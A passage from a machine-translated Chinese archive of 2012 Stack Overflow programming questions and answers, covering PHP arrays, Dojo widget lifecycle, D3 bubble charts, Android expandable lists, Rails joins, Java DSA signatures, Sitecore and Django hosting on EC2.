       (
            [court_name] => P
       )

      [1] => Array
      (
           [court_name] => S
      )

 ) 
```

而不是这个

```
 Array
 (
      [0] => Array
       (
            [court_name] => Punjab
       )

      [1] => Array
      (
           [court_name] => Sindh
      )

 ) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:08:42.493

（参考输出）在您的循环中，`$result`包含法院名称。所以如果你使用`$result[0]`，你会得到字符串的第一个字符。

尝试这个：

```
foreach ($court_name as $result)
{
    $data[] = array(
        'court_name' => $result
    );
    $i++;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:14:52.010

foreach 循环为您提供数组 ( `$result`) 的一个元素，现在您可以通过 访问 value 的第一个字符`$result[0]`，将其更改为`$result`

```
foreach ($court_name as $result) {
  $data[] = array( 'court_name' => $result );
} 
```

# c# - 可以使用林孚动态代理来代理带有泛型参数的接口吗？

> ID：13514439
> 
> 赞同：0
> 
> 时间：2012-11-22T14:07:24.317
> 
> 标签：c#, dynamic-proxy, linfu-dynamicproxy

我目前正在使用 Linfu 创建动态代理，它对于普通接口非常有效。问题是我现在需要为具有通用参数的接口创建一个动态代理。直到运行时，我才知道泛型参数的类型（甚至加载包含它们的程序集）。有谁知道这是否可能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T16:12:09.613

好的，我可以通过使用反射调用 MyProxyFactory.CreateProxy< T >() 来做到这一点：

```
 Type myGenericParam1 = myParam1.GetType();
        Type myGenericParam2 = myParam2.GetType();
        Type myGenericInterfaceType = typeof(IMyInterface<,>);
        Type myActualInterfaceType = myGenericInterfaceType.MakeGenericType(myGenericParam1, myGenericParam2);
        var proxyObjectContainer = typeof(MyProxyFactory).GetMethod("CreateProxy", new Type[] { }).MakeGenericMethod(new[] { myActualInterfaceType }).Invoke(null, new object[] { });

        var proxyObject = proxyObjectContainer.GetType().GetProperty("Proxy").GetValue(proxyObjectContainer, null); 
```

显然，如果您需要将参数传递给代理工厂构造函数以设置拦截器，那么这也需要添加到创建 proxyObjectContainer 的行中。

# java - ScheduledThreadPoolExecutors 和自定义队列

> ID：13514441
> 
> 赞同：5
> 
> 时间：2012-11-22T14:07:29.313
> 
> 标签：java, multithreading, concurrency, executorservice, executors

如果我使用 a`ThreadPoolExecutor`我有各种构造函数，我可以传递/使用我自己的队列作为池的工作队列。
现在我看到 a`ScheduledThreadPoolExecutor`是的子类，`ThreadPoolExecutor`但构造函数要少得多。
有没有办法使用 a`ScheduledThreadPoolExecutor`并且仍然使用我自己的工作队列？

* * *

## 回答 #1

> 赞同：-3
> 
> 时间：2012-11-22T14:17:34.763

您可以扩展`ScheduledThreadPoolExecutor`类并使用`DelayedWorkQueue`与当前`ScheduledThreadPoolExecutor`实现绑定的不同队列。请注意，这`DelayedWorkQueue`只是一个在幕后`BlockingQueue`使用的实现。`DelayQueue`

但是，如果您只需要配置 min、max、keepAlive 或其他参数（不需要更改`DelayedWorkQueue`），您只会扩展`ThreadPoolExecutor`（类似于`ScheduledThreadPoolExecutor`正在做的事情）并且在您的构造函数中，您将执行类似于`ScheduledThreadPoolExecutor`构造函数正在做的事情现在，委托给`ThreadPoolExecutor`喜欢的人：

```
super(min, max, keepAliveTime, TimeUnit.NANOSECONDS,
   new CustomQueue(), threadFactory); 
```

# c++ - 在代码中使用 stlport 库的主要原因是什么？

> ID：13514449
> 
> 赞同：1
> 
> 时间：2012-11-22T14:08:03.900
> 
> 标签：c++, visual-c++, stlport

我看到有人在 Visual C++ 中使用 stlport，但我认为标准 C++ 库已经包含在 Visual C++ 中？使用 stlport 有什么好处？stlport 是免费的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:20:07.210

很可能代码是在 Visual c++ 完全实现之前编写的（例如在 VC6 中），或者代码是跨平台的，并且作者希望确保每个平台上都有相同的库。（最近这不是什么大问题，但即使在 2 或 3 年前，每个实现与标准的实质性差异也大得多）

# javascript - dojo - 小部件在第一个实例上未正确显示

> ID：13514450
> 
> 赞同：0
> 
> 时间：2012-11-22T14:08:04.723
> 
> 标签：javascript, dojo, widget

我一直在使用[dojo 1.8 框架来创建一个](http://dojotoolkit.org/documentation/tutorials/1.8/understanding_widgetbase/)包含其他一些[菜单小部件的小部件](http://dojotoolkit.org/documentation/tutorials/1.8/menus/)。当我创建它的实例时，它会出现，但仅显示基本模板元素，并且在仔细检查下，尚未添加菜单小部件。然后，当我创建它的第二个实例（通过按钮单击）时，它会正确显示，包括菜单。

这真的让我很困惑，有什么想法吗？

哦，顺便说一下，我正在小部件实例上调用 startup()。

这是我的模板的代码...

```
<div class="${!baseClass}ConfigPanel">
        <div data-dojo-attach-point="heading">Configure data</div>
        <div id="menuContainer" data-dojo-attach-point="menu"></div>
</div> 
```

这是我的小部件的代码...

```
define(
    ["dojo/_base/array",
    "dijit/Menu",
    "dijit/MenuItem",
    "dijit/PopupMenuItem",
    "dojo/_base/declare",
    "dijit/_WidgetBase",
    "dijit/_TemplatedMixin",
    "dojo/text!gdv/chart/configuration/panel/chartConfigTemplate.html",
    "dojo/domReady!"],
    function (ArrayUtil, Menu, MenuItem, PopupMenu, declare, WidgetBase, TemplatedMixin, template){

        var _menuData = [{title:"Region", data:["Region1", "Region2", "Region3"]},
                                        {title: "Variable", data:["variable1", "variable2", "variable3"]},
                                        {title: "Period", data:["period1", "period2"]},
                                        {title: ["latest", "rt1", "rt2"]}];

        /**
         * Build menu items up with a popup menu style
         */
        function buildMenu(nodeId, menuItems){
            var mainMenu = new Menu({label: "main menu"}, nodeId);
            var subMenuCollection = [];
            var subMenu;

            ArrayUtil.forEach(menuItems, function(item, index){
                subMenu = new Menu({label: item.title});
                subMenuCollection.push(subMenu);

                //loop through each item in data and create a new menu item from it
                ArrayUtil.forEach(item.data, function(subItem, subIndex){
                    subMenu.addChild(new MenuItem({label: subItem}));
                });

                //set the sub menu to popup from the main menu
                mainMenu.addChild(new PopupMenu({label: item.title, popup: subMenu}));

            });

            //create the menus
            mainMenu.startup();

            //start each sub menu
            ArrayUtil.forEach(subMenuCollection, function (item, index){
                item.startup();
            });
        }

        //return a new widget class
        return declare([WidgetBase, TemplatedMixin], {
            templateString: template,
            baseClass: "plumePlots",

            //when dom structure is ready but before page insertion
            postCreate: function(){

                //run all parent postCreate functions
                this.inherited(arguments);

                var menuNode = this.menu;
                buildMenu(menuNode.id, _menuData);
            }
        });
    }
) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:15:48.957

好的，我找到了答案，这取决于小部件的生命周期，直接来自 dojo[小部件教程](http://dojotoolkit.org/documentation/tutorials/1.8/understanding_widgetbase/)的引用应该有助于解释......

> 启动（）
> 
> 可能 Dijit 生命周期中第二重要的方法是启动方法。此方法旨在处理任何 DOM 片段实际添加到文档后的处理；在创建并启动任何潜在的子小部件之前，它不会被触发。这对于复合小部件和布局小部件很有用。

所以事实证明我试图引用一个尚未添加到文档中的 dom 元素。

为了修复我的代码，我只是将创建菜单小部件的代码从 postCreate() 方法移到了 startup() 方法中，问题解决了，这里是显示更改的代码片段......

```
//return a new widget class
        return declare([WidgetBase, TemplatedMixin], {
            templateString: template,
            baseClass: "plumePlots",

            //when dom structure is ready but before page insertion
            postCreate: function(){             
                //run all parent postCreate functions
                this.inherited(arguments);
            },

            startup: function(){  // added startup function
                var menuNode = this.menu; // code moved to here
                buildMenu(menuNode.id, _menuData); // and here
            }
        }); 
```

# c# - 实体框架中的复杂图形

> ID：13514453
> 
> 赞同：1
> 
> 时间：2012-11-22T14:08:18.530
> 
> 标签：c#, linq, entity-framework, graph

我似乎找不到正确的 where 子句来仅获取我需要的项目。

我有部门，这些包含类别，这些包含项目。这些是类：

```
public class Division    {
        public string Description { get; set; }

        public List<Category> Categories { get; set; }
    }

public class Category : IdEntity
{
    public string Description { get; set; }

    public Guid DivisionId { get; set; }

    public List<Item> Items { get; set; }
}

public class Item
{
    public Guid CategoryId { get; set; } 

    public DateTime Date { get; set; }

    public string Description { get; set; }
} 
```

我需要的是一个在参数中带有 Id 的部门，该部门的所有类别以及每个类别都有特定日期的项目。

所以现在我这样做：

```
public Division GetFullDivisionByIdAndDate(Guid id, DateTime date)
    {
        using (new ChangeTrackingScope(ChangeTracking.Disabled))
        {
            var divisionGraph = new Graph<Division>().Include(d => d.Categories.Select(c => c.Items));
            var division = _divisionDL.GetFullDivisionByIdAndDate(id, divisionGraph, date);
            return division;
        }
    } 
```

比在 DL 我做的

```
 public Division GetFullDivisionByIdAndDate(Guid id, Graph<Division> graph, DateTime date)
    {
        using (var db = new ContextScope<DatabaseContext>())
        {
            var q = graph.ApplySetReferences(db.Context.Divisions).AsNoTracking();
            return q.SingleOrDefault(p => p.Id == id);
        }
    } 
```

在这里，我得到了所有类别的划分（到目前为止一切都很好），但我也得到了所有项目，我只需要将日期作为参数给出的项目。任何人都知道如何做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T23:16:36.370

由于缺少一些方法（`Graph`, `ApplySetReferences`），您的代码不是很容易访问，所以我无法使用它。但我可以展示一种查询对象图的常用方法，即通过导航属性。在您的模型中，基本查询主体可能如下所示：

```
from d in Divisions
from c in d.Categories
from i in c.Items
select new { Div = d.Description, Cat = c.Description, Item = i.Description } 
```

从这里开始，您可以添加其他过滤器和属性，例如

```
from d in Divisions.Where(div => div.Id == id)
from c in d.Categories
from i in c.Items.Where(item => item.Date == date)
select new { ... } 
```

或者，如果您想要过滤集合中的项目的结果：

```
from d in Divisions.Where(div => div.Id == id)
from c in d.Categories
select new new { Div = d.Description,
                 Cat = c.Description,
                 Items = c.Items.Where(item => item.Date == date)
               } 
```

# javascript - IE 7 的选项不兼容

> ID：13514458
> 
> 赞同：0
> 
> 时间：2012-11-22T14:08:51.980
> 
> 标签：javascript, internet-explorer, options

在我的 JSP 中，我正在使用以下代码动态创建选项。

```
if(arr[i] != null && arr[i] != ""){
        subArray = arr[i].split("|");
        id = subArray[0];
        text = subArray[1];
        serviceListAll.options[serviceListAll.length]= new Option(text, id);
    } 
```

但是我注意到一件事，如果我直接将它们放入`subArray[0]`而不是将它们存储到中间变量中，那么 IE 7 不会显示新创建的选项文本。它显示一个带有空文本的选项。`subArray[1]``new Option()`

这背后的原因是什么？

# jquery - 如果服务器返回缓存预防标头，是否需要 jQuery 缓存禁用技巧？

> ID：13514459
> 
> 赞同：3
> 
> 时间：2012-11-22T14:08:54.810
> 
> 标签：jquery, http, http-headers, browser-cache, http-caching

我需要完全防止缓存 Ajax 调用结果。Jquery ajax() 函数对此有一个`cache: false`选项。该选项将时间戳附加到每个请求的资源 ( `?_=1353592676117`)。这应该可以完成工作，但不是很优雅。它会污染日志，对于不熟悉该技巧的人来说可能会令人费解。

如果服务器返回一组正确的缓存预防标头（`no-cache`, `no-store`, `must-revalidate`，也可选`max-age=0`），是否需要启用此选项？如果是这样，在哪些情况下标题是不够的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T10:09:30.500

`cache: false`如果您在服务器上设置正确的缓存预防响应标头，则不需要设置标志。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-11T12:05:15.527

供参考：我发现了一种缓存禁用标头被忽略的情况。在 Chrome 中，如果您点击后退按钮以返回执行 JavaScript 的页面，则脚本会重新执行，但对脚本所做的 Ajax 调用的响应将从缓存中返回，即使它们最初是通过禁用缓存的标头返回的.

# javascript - D3.js 在气泡图中消失的气泡

> ID：13514461
> 
> 赞同：1
> 
> 时间：2012-11-22T14:08:56.910
> 
> 标签：javascript, svg, d3.js, circle-pack

我正在尝试为可以包含一些 0 值的数组显示 D3 气泡图。如果 0 的数量达到高气泡开始“消失”。请参阅此示例（它应该显示 10 个气泡）： [jsfiddle 上的示例](http://jsfiddle.net/WWxqh/1/)

难道我做错了什么？

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

<html>

<head>
   <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
   <meta name="language" content="de">
   <title>Disappearing bubble Problem</title>

   <meta http-equiv="Content-Script-Type" content="text/javascript">
   <script type="text/javascript" src="http://d3js.org/d3.v2.min.js"></script>
   <script type="text/javascript" src="http://code.jquery.com/jquery-1.8.3.min.js"></script>

<script type='text/javascript'> 
$(document).ready(function(){ 
var r = 700
var bubble_layout = d3.layout.pack()
    .size([r,r])
    .padding(1.5);

var vis = d3.select("#chart").append("svg")
    .attr("width" , r)
    .attr("height", r)

var arr = [
   { name : '1', value: 1 }
  ,{ name : '2', value: 1 }
  ,{ name : '3', value: 1 }
  ,{ name : '4', value: 1 }
  ,{ name : '5', value: 1 }
  ,{ name : '6', value: 1 }
  ,{ name : '7', value: 1 }
  ,{ name : '8', value: 1 }
  ,{ name : '9', value: 1 }
  ,{ name : '10', value: 1 } 
  ,{ name : '11', value: 0 } //Adding data elements with value 0 makes bubbles disappear
  ,{ name : '12', value: 0 }
  ,{ name : '13', value: 0 }
  ,{ name : '14', value: 0 }
  ,{ name : '15', value: 0 }
  ,{ name : '16', value: 0 }
  ,{ name : '17', value: 0 }
  ,{ name : '18', value: 0 }
  ,{ name : '19', value: 0 }
  ,{ name : '20', value: 0 }
  ,{ name : '21', value: 0 }
  ,{ name : '22', value: 0 }
  ,{ name : '23', value: 0 }
  ,{ name : '24', value: 0 }
  ,{ name : '25', value: 0 }
  ,{ name : '26', value: 0 }
  ,{ name : '27', value: 0 }
  ,{ name : '28', value: 0 }
  ,{ name : '29', value: 0 }
  ,{ name : '30', value: 0 }
  ,{ name : '31', value: 0 }
  ,{ name : '32', value: 0 }
  ,{ name : '33', value: 0 }
  ,{ name : '34', value: 0 }
  ,{ name : '35', value: 0 }
  ,{ name : '36', value: 0 }  
];

var selection = vis.selectAll("g.node")
              .data(bubble_layout.nodes({children: arr}).filter(function(d) { return !d.children; }) ); 

//Enter
node = selection.enter().append("g")
              .attr("class", "node")
              .attr("transform", function(d) { return "translate(" + d.x + ", " + d.y + ")"; });

node.append("circle")
    .attr("r", function(d) { return d.r; })
    .style("fill", function(d) { return 'aaaaaa'; });

node.append("text")
    .attr("text-anchor", "middle")
    .attr("dy", ".3em")
    .text(function(d) { return d.name; });

} );
</script>

</head>

<body>
  <span id='chart'>
</body>

</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T00:49:13.687

您的圈子不会消失，它们会被渲染，但会被其他人覆盖。

您可以将包布局的排序顺序更改为升序以外的其他顺序 - 这是默认设置。可以设置为空

```
var bubble_layout = d3.layout.pack()
                      .sort(null) // <-- HERE
                      .size([r,r])
                      .padding(1.5); 
```

此外，您可能希望过滤您的选择以仅包含值大于 0 的项目，以避免创建半径为零的圆。

```
var node = selection.enter().append("g")
                    .attr("class", "node")
                    .attr("transform", function(d) { 
                        return "translate(" + d.x + ", " + d.y + ")"; 
                    })
                    .filter(function(d){    
                        return d.value > 0; // <-- HERE 
                    }) 
```

更新的 JSFiddle：http: [//jsfiddle.net/jaimem/WWxqh/4/](http://jsfiddle.net/jaimem/WWxqh/4/)

为了防止统一的外观，您需要更改`value`属性，因为 d3.js 使用它来发挥它的魔力。检查这个小提琴：http: [//jsfiddle.net/jaimem/WWxqh/5/](http://jsfiddle.net/jaimem/WWxqh/5/)

# java - BaseExpandableListAdapter 中的不可扩展项

> ID：13514463
> 
> 赞同：1
> 
> 时间：2012-11-22T14:09:10.280
> 
> 标签：java, android, listview, expandablelistview

我有三种组类型，TYPE_SEPARATOR、TYPE_EXAM、TYPE_HOMEWORK，后两种我需要展开 onClick 工作正常。我不想夸大 TYPE_SEPARATOR 的视图，但我正在努力找出如何实现这一点。任何回应将不胜感激。此适配器正在使用 BaseExpandableListAdapter。

这是给 childViews

```
@Override
public View getChildView(int groupPosition, int childPosition,
        boolean isLastChild, View convertView, ViewGroup parent) {
        View v = convertView;
        LayoutInflater vi;
        int type = getGroupType(groupPosition);
        days = 0;

        switch (type){
            case TYPE_SEPARATOR:
                    v = null;
                break;
            case TYPE_EXAM:
                Exam exam = (Exam) objects.get(groupPosition);
                if (v == null) {
                    vi = context.getLayoutInflater();
                    v = vi.inflate(R.layout.expandeditem, null);
                    holder.tV_expandedItem_days = (TextView) v.findViewById(R.id.tV_expandedItem_days);
                    holder.tV_expandedItem_grade = (TextView) v.findViewById(R.id.tV_expandedItem_grade);
                    v.setTag(holder);
                } else {
                    holder = (ViewHolder) v.getTag();
                }

                formatter = DateTimeFormat.forPattern("dd MMM YYYY");
                now = new DateTime();
                objectDate = DateTime.parse(exam.getDate(), formatter);
                d = Days.daysBetween(now, objectDate);
                days = d.getDays() + 1; 
                if (days > 0){
                    holder.tV_expandedItem_days.setText(String.valueOf(days) + " days to go");

                }                   
                else {
                    days = days * -1;
                    holder.tV_expandedItem_days.setText(String.valueOf(days) + " days ago");
                }

                holder.mark = exam.getMark();
                holder.maxMark = exam.getMaxMark();
                if (exam.getMaxMark() > 0) {
                    holder.tV_expandedItem_grade.setVisibility(View.VISIBLE);
                    holder.percentage = (holder.mark / holder.maxMark) * 100;
                    holder.tV_expandedItem_grade.setText(new Grade().get(holder.percentage));
                } else {
                    holder.tV_expandedItem_grade.setText("?");
                }                   

                break;
            case TYPE_HOMEWORK:
                Homework homework = (Homework) objects.get(groupPosition);
                if (v == null) {
                    vi = context.getLayoutInflater();
                    v = vi.inflate(R.layout.expandeditem, null);
                    holder.tV_expandedItem_days = (TextView) v.findViewById(R.id.tV_expandedItem_days);
                    holder.tV_expandedItem_grade = (TextView) v.findViewById(R.id.tV_expandedItem_grade);
                    v.setTag(holder);
                } else {
                    holder = (ViewHolder) v.getTag();
                }

                formatter = DateTimeFormat.forPattern("dd MMM YYYY");
                now = new DateTime();
                objectDate = DateTime.parse(homework.getDate(), formatter);
                d = Days.daysBetween(now, objectDate);
                days = d.getDays() + 1; 
                if (days > 0){
                    holder.tV_expandedItem_days.setText(String.valueOf(days) + " days to go");

                }
                else {
                    days = days * -1;
                    holder.tV_expandedItem_days.setText(String.valueOf(days) + " days ago");
                }   

                holder.mark = homework.getMark();
                holder.maxMark = homework.getMaxMark();

                if (homework.getMaxMark() > 0) {
                    holder.percentage = (holder.mark / holder.maxMark) * 100;
                    holder.tV_expandedItem_grade.setText(new Grade().get(holder.percentage));
                } else {
                    holder.tV_expandedItem_grade.setText("?");
                }

                break;
        }

        return v;
} 
```

这是针对 groupViews

```
@Override
public View getGroupView(int groupPosition, boolean isExpanded,
        View convertView, ViewGroup parent) {
    View v = convertView;
    int type = getGroupType(groupPosition);
    holder = new ViewHolder();
    LayoutInflater vi;
    switch (type) {
        case TYPE_SEPARATOR:
            if (v == null) {
                vi = context.getLayoutInflater();
                v = vi.inflate(R.layout.completedseparator, null);
            } else {
                holder = (ViewHolder) v.getTag();
            }
            break;
        case TYPE_EXAM:
            if (v == null) {
                vi = context.getLayoutInflater();
                v = vi.inflate(R.layout.examitem, null);

                holder.tV_title = (TextView) v.findViewById(R.id.tV_title);
                holder.tV_startTime = (TextView) v.findViewById(R.id.tV_startTime);
                holder.tV_date = (TextView) v.findViewById(R.id.tV_date);
                holder.tV_grade = (TextView) v.findViewById(R.id.tV_grade);

                holder.tV_grade.setVisibility(View.GONE);
                holder.tV_title.setEllipsize(TruncateAt.MARQUEE);
                holder.tV_title.setSelected(true);

                v.setTag(holder);
            } else {
                holder = (ViewHolder) v.getTag();
            }

            holder.exam = (Exam) objects.get(groupPosition);

            if ((holder.exam != null)) {
                holder.tV_title.setText(holder.exam.getTitle());
                holder.tV_startTime.setText(holder.exam.getStartTime());
                holder.tV_date.setText(holder.exam.getDate());
                holder.tV_title.setText(holder.exam.getTitle());
                holder.tV_startTime.setText(holder.exam.getStartTime());
                holder.tV_date.setText(holder.exam.getDate());
            }

            break;
        case TYPE_HOMEWORK:
            if (v == null) {
                vi = context.getLayoutInflater();
                v = vi.inflate(R.layout.homeworkitem, null);

                holder.tV_homework_subject = (TextView) v
                        .findViewById(R.id.tV_homework_subject);
                holder.tV_homework_description = (TextView) v
                        .findViewById(R.id.tV_homework_description);
                holder.tV_homework_date = (TextView) v
                        .findViewById(R.id.tV_homework_date);
                holder.tV_homework_grade = (TextView) v
                        .findViewById(R.id.tV_homework_grade);
                holder.tV_homework_time = (TextView) v
                        .findViewById(R.id.tV_homework_time);

                holder.tV_homework_grade.setVisibility(View.GONE);
                holder.tV_homework_description.setEllipsize(TruncateAt.MARQUEE);
                holder.tV_homework_description.setSelected(true);

                v.setTag(holder);
            } else {
                holder = (ViewHolder) v.getTag();
            }

            holder.homework = (Homework) objects.get(groupPosition);

            holder.tV_homework_subject.setText(holder.homework.getSubject());
            holder.tV_homework_description.setText(holder.homework.getDescription());
            holder.tV_homework_date.setText(holder.homework.getDate());
            holder.tV_homework_time.setText(holder.homework.getTime());

            break;
    }
    return v;
} 
```

编辑！

我的适配器的问题是 getChildrenCount 方法总是返回 1。这是新方法。

```
@Override
public int getChildrenCount(int groupPosition) {
    int count = 0;
    if (objects.get(groupPosition).getClass().equals(String.class)) {
        count = 0;
    }
    if (objects.get(groupPosition).getClass().equals(Exam.class)) {
        count = 1;
    }
    if (objects.get(groupPosition).getClass().equals(Homework.class)) {
        count = 1;
    }
    return count;
} 
```

感谢提琴手帮助我！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:53:13.913

您需要确保您的`getChildrenCount()`方法为 type 的项目返回 0 `TYPE_SEPARATOR`。

# ruby-on-rails - 查找子对象满足条件的父对象数组

> ID：13514466
> 
> 赞同：1
> 
> 时间：2012-11-22T14:09:18.367
> 
> 标签：ruby-on-rails

我有一个包含国家、客户和订单的 rails 应用程序。订单属于客户，客户属于国家，客户有很多订单，国家有很多客户。

```
class Client < ActiveRecord::Base
    has_many :orders
    belongs_to :country
end
class Country < ActiveRecord::Base
    has many :clients
end
class Order < ActiveRecord::Base
    attr_accessible :total
    belongs_to :client
end 
```

我试图找出最快的方法，以在控制器中获取来自给定国家/地区的一组客户，这些客户至少有一个满足特定条件的订单。例如：来自西班牙的客户，他们至少有一份总金额超过 100 美元的订单。

我在想我应该使用联接，但不知道该怎么做。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:32:55.497

你只需要加入`:orders`。

```
c = Country.find(id_for_spain)
filtered_clients = c.clients.joins(:orders).where("orders.total > ?", 100) 
```

# android - 查看 DDMS 中的服务

> ID：13514473
> 
> 赞同：1
> 
> 时间：2012-11-22T14:09:35.133
> 
> 标签：android, service, ddms

是否有解决方案可以在 DDMS 中查看当前正在运行哪些服务？

我正在寻找类似于线程视图的东西来检查我的应用程序服务的绑定/解除绑定。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:14:08.737

> 是否有解决方案可以在 DDMS 中查看当前正在运行哪些服务？

不，对不起。但是，`adb shell dumpsys activity services`应该给你你需要的东西，尽管输出格式并不完全对用户友好。

# java - 在java中的函数调用中定义一个数组

> ID：13514474
> 
> 赞同：0
> 
> 时间：2012-11-22T14:09:40.453
> 
> 标签：java, arrays, function

目前我有下面的代码。

```
String[] ans = {"Yes","No"};
option = questionAsk("Are you sure?",ans); 
```

我尝试简单地将“ans”的定义粘贴到函数的调用中，并尝试对其进行更改，但我似乎无法找到如何使这两行合二为一。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-22T14:10:19.223

调用方法时可以定义数组：

`option = questionAsk("Are you sure?", new String[]{"Yes","No"});`

# javascript - 带有 DIV 标记的未确定字符串文字错误

> ID：13514475
> 
> 赞同：0
> 
> 时间：2012-11-22T14:09:41.733
> 
> 标签：javascript, jquery, string, literals

我有一个 Javascript / JQuery 问题。

使用此代码时，我得到未终止的字符串文字：

```
var newInfo = '<div><span class="testClass"><a title="edit" href="'+link+'">'+oldVal+'</a></span></div>'; 
```

如果我删除`</div>` 标签，它可以工作......但我需要这个。我完全没有想法。

也许你能帮忙，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:21:51.920

逃脱你的斜线。

```
var newInfo = '<div><span class="testClass"><a title="edit" href="' + link + '">' + oldVal + '<\/a><\/span><\/div>'; 
```

您也可以将您的 html 构建为实际的 DOM 元素而不是字符串（这避免了很多陷阱，包括这个）。

```
var div = $('<div />'),
    span = $('<span />').addClass('testClass'),
    a = $('<a />').text(oldVal).attr({
        "href": link,
        "title": "edit"
    }),
    newInfo = div.append(span.append(a)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:13:06.243

尝试使用

```
var newInfo = '<di'+'v><span class="testClass"><a title="edit" href="'+link+'">'+oldVal+'</a></span></di'+'v>'; 
```

分离 div 标签帮助我解决了类似的问题

# java - Java Signature 无法跨平台验证

> ID：13514477
> 
> 赞同：2
> 
> 时间：2012-11-22T14:09:52.280
> 
> 标签：java, signature

我有一个问题，我无法解决它。我在 linux 上创建了一个签名对象，并尝试在 windows 上验证它，但它失败了。反过来也一样。如果我留在一个平台上，一切都很好。

首先我想到了编码，所以我开始了一些测试，比如将 -Dfile.encoding 设置为不同的标准。但即使我使用 UTF-8 创建签名并使用 windows-1215 验证它，如果我留在同一个平台上，一切都很好。

该代码非常基本，我只是找不到问题：

创建签名：

```
public void signData(File fileToSign, String outPutFileName)...
{
    Signature dsa = Signature.getInstance("DSA");
    dsa.initSign(privateKey);

    byte[] bytesToSign = FileUtils.readByteArrayFromFile(fileToSign);
    dsa.update(bytesToSign);

    byte[] sigData = dsa.sign();
    FileUtils.saveByteArrayToFile(outPutFileName, sigData);
}

public static void saveByteArrayToFile(String outPutFileName, byte[] bytesToSave)...
{
    FileOutputStream fos = new FileOutputStream(outPutFileName);
    fos.write(Base64.encodeBase64(bytesToSave));
    fos.close();
} 
```

验证它：

```
public boolean isVerified(File fileToVerify, File signatureFile)...
{
    byte[] sigData = FileUtils.readByteArrayFromFile(signatureFile);

    Signature signature = Signature.getInstance("DSA");
    signature.initVerify(publicKey);

    byte[] byteToVerify = FileUtils.readByteArrayFromFile(fileToVerify);
    signature.update(byteToVerify);

    return signature.verify(sigData);
}

public static byte[] readByteArrayFromFile(File file)...
{
    FileInputStream fis = new FileInputStream(file);
    byte[] byteArray = new byte[fis.available()];
    fis.read(byteArray);
    fis.close();

    return Base64.decodeBase64(byteArray);
} 
```

我希望有人能指出我正确的方向。
谢谢。

亲切的问候，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:18:32.347

我终于找到了解决方案。问题确实是编码。现在我只是对我的数据进行解码和编码，一切都很好。我相应地更新了代码。

# c# - 让孩子们进入 sitecore

> ID：13514481
> 
> 赞同：8
> 
> 时间：2012-11-22T14:10:05.833
> 
> 标签：c#, asp.net, sitecore

我正在尝试在 Sitecore 的父页面上列出具有设置模板的项目。到目前为止，我可以为孩子们做这件事，但我也想包括孩子们的孩子，即父母下的任何东西，如果它有选择的模板，它将起作用，这是我在 c# 文件中的代码：

```
lvThing.DataSource = context.Children.Where(x => x.TemplateName == "cool    template").ToList<Item>();
lvThing.DataBind(); 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-22T14:46:34.583

如果你想要孩子下面的项目，你可以使用 item.Axes.GetDescendants() 方法来获取上下文项目下面的所有项目。

您的代码应如下所示：

```
contextItem.Axes.GetDescendants().Where(x => x.TemplateName == "cool    template").ToList(); 
```

# django - 最佳实践：单个 Amazon EC2 实例上的多个 django 应用程序

> ID：13514488
> 
> 赞同：1
> 
> 时间：2012-11-22T14:10:31.387
> 
> 标签：django, nginx, amazon-ec2, amazon-web-services, gunicorn

我一直在 Amazon EC2 上运行单个 django 应用程序，使用 gunicorn 为 django 部分和静态文件提供 nginx。

我将很快开始新项目，并想知道以下哪个选项会更好：

1.  运行多个 django 应用程序的大型亚马逊 EC2 实例（中）
2.  多个较小的 EC2 实例（小型/微型）都运行自己的 django 应用程序？

有人有这方面的经验吗？我可以测量哪些相关性能指标来获得良好的成本性能比？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-06T13:55:26.393

恐怕这个问题的答案真的取决于你的应用程序。您需要进行基准测试以确保您在正确的实例类型上运行。需要注意的一些关键指标是：

*   中央处理器
*   内存使用情况
*   每秒请求数，每个实例大小
*   应用启动时间

您还需要调整 nginx/gunicorn 设置，以确保您运行的配置针对您的实例大小进行了优化。

如果成本是您考虑的一个因素，那么一个有趣的指标是“每万个请求的成本”，即您为每种实例类型的每 10000 个请求支付多少费用？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-09-08T13:33:19.830

我同意迈克瑞恩的回答。我要补充一点，您还必须评估您的应用程序是否需要单独的数据库。有时将大型/复杂的应用程序与它们自己的数据库隔离是有意义的，这使得更改和维护更容易。（如果出现问题，也可以降低您的风险）。在中断的情况下，并非所有用户群都会受到影响。您可能希望为这些应用程序创建一个单独的实例。注意：Django 在一个项目中支持多个数据库，但这又增加了更改和维护的复杂性。

# actionscript-3 - 在多个对象和目标上拖放

> ID：13514491
> 
> 赞同：0
> 
> 时间：2012-11-22T14:10:36.630
> 
> 标签：actionscript-3, flash

我有几个球，每个球都与一个水果相关联。我想要它，这样当有人将球拖到相关的水果上时，它会调用一个动作（在这种情况下跟踪“击中水果”），如果不是，那么做其他事情。目前它没有检测到这一点。

我发现我可以在舞台上添加一个均匀的监听器来检测何时完成，但问题是我有多个球，每个球都有多个水果。谁能告诉我我是怎么做的。

我来自 PHP/Javascript 背景，只是 AS3 的初学者

```
ball1.addEventListener(MouseEvent.MOUSE_DOWN, mouseDownHandler);
ball1.addEventListener(MouseEvent.MOUSE_UP, mouseUpHandler);

function mouseUpHandler(e:MouseEvent):void {
   var obj = e.target;

